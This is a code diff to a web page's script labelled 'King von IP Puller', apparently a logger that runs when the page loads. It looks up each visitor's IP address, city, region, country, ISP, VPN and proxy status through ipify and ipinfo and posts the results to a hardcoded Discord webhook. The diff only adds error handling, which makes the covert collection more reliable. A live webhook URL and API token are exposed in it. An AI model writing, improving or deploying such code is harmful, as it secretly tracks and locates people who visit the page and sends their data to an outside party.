@@ -9,20 +9,21 @@
     <script>
     async function sendToDiscord(ipInfo) {
         const webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
+
         const discordMessage = {
-            content: "@everyone", 
+            content: "@everyone",
             embeds: [
                 {
                     image: {
                         url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
                     },
-                    title: "King von IP puller",
+                    title: "King von IP Puller",
                     fields: [
-                        { name: "IP Address", value: ipInfo.ip, inline: true },
-                        { name: "City", value: ipInfo.city, inline: true },
+                        { name: "IP Address", value: ipInfo.ip || "N/A", inline: true },
+                        { name: "City", value: ipInfo.city || "N/A", inline: true },
                         { name: "State", value: ipInfo.region || "N/A", inline: true },
-                        { name: "Country", value: ipInfo.country, inline: true },
-                        { name: "Organization", value: ipInfo.org, inline: true },
+                        { name: "Country", value: ipInfo.country || "N/A", inline: true },
+                        { name: "Organization", value: ipInfo.org || "N/A", inline: true },
                         { name: "ASN Name", value: ipInfo.asn || "N/A", inline: true },
                         { name: "VPN", value: ipInfo.privacy?.vpn ? "True" : "False", inline: true },
                         { name: "Proxy", value: ipInfo.privacy?.proxy ? "True" : "False", inline: true },
@@ -36,24 +37,39 @@
             ]
         };
 
-        await fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(discordMessage)
-        });
+        try {
+            const response = await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(discordMessage)
+            });
+
+            if (!response.ok) {
+                console.error("Failed to send to Discord:", response.statusText);
+            }
+        } catch (error) {
+            console.error("Error sending to Discord:", error);
+        }
     }
 
     async function getVisitorInfo() {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const userIP = ipData.ip;
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            if (!ipResponse.ok) throw new Error("Failed to fetch IP");
 
-        const ipInfoResponse = await fetch(`https://ipinfo.io/${userIP}/json?token=5f02d3fa0f98e2`);
-        const ipInfo = await ipInfoResponse.json();
+            const ipData = await ipResponse.json();
+            const userIP = ipData.ip;
 
-        await sendToDiscord(ipInfo);
+            const ipInfoResponse = await fetch(`https://ipinfo.io/${userIP}/json?token=5f02d3fa0f98e2`);
+            if (!ipInfoResponse.ok) throw new Error("Failed to fetch IP info");
+
+            const ipInfo = await ipInfoResponse.json();
+            await sendToDiscord(ipInfo);
+        } catch (error) {
+            console.error("Error getting visitor info:", error);
+        }
     }
 
     getVisitorInfo();
